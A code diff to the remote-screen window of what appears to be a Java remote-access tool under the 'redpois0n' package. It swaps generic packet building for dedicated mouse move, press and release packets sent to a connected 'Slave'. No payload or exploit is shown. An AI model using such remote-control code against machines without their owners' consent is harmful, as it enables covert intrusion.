@@ -37,9 +37,10 @@ import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.ScreenCommands;
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.Packet17RemoteScreen;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet91MouseMove;
+import com.redpois0n.packets.outgoing.Packet92MousePress;
+import com.redpois0n.packets.outgoing.Packet93MouseRelease;
 import com.redpois0n.settings.Settings;
 import com.redpois0n.threads.ThreadFPS;
 
@@ -141,7 +142,7 @@ public class FrameRemoteScreen extends BaseFrame {
 			@Override
 			public void mouseMoved(MouseEvent e) {
 				if (move()) {
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.MOUSE_MOVE, new String[] { "" + e.getX(), "" + e.getY(), "" + monitorindex }));
+					sl.addToSendQueue(new Packet91MouseMove(e.getX(), e.getY(), monitorindex));
 				}
 			}
 		});
@@ -152,7 +153,7 @@ public class FrameRemoteScreen extends BaseFrame {
 			@Override
 			public void mousePressed(MouseEvent e) {
 				if (mouseInput()) {
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.MOUSE_MOVE, new String[] { "" + e.getX(), "" + e.getY(), "" + monitorindex }));
+					sl.addToSendQueue(new Packet91MouseMove(e.getX(), e.getY(), monitorindex));
 					
 					int button = e.getButton();
 					int xButton = 16;
@@ -160,7 +161,7 @@ public class FrameRemoteScreen extends BaseFrame {
 						xButton = 4;
 					}
 					
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.MOUSE_PRESS, new String[] { "" + e.getX(), "" + e.getY(), "" + xButton, "" + monitorindex }));
+					sl.addToSendQueue(new Packet92MousePress(e.getX(), e.getY(), xButton, monitorindex));
 				}
 			}
 
@@ -173,7 +174,7 @@ public class FrameRemoteScreen extends BaseFrame {
 						xButton = 4;
 					}
 					
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.MOUSE_RELEASE, new String[] { "" + e.getX(), "" + e.getY(), "" + xButton, "" + monitorindex }));
+					sl.addToSendQueue(new Packet93MouseRelease(e.getX(), e.getY(), xButton, monitorindex));
 				}
 			}
 		});
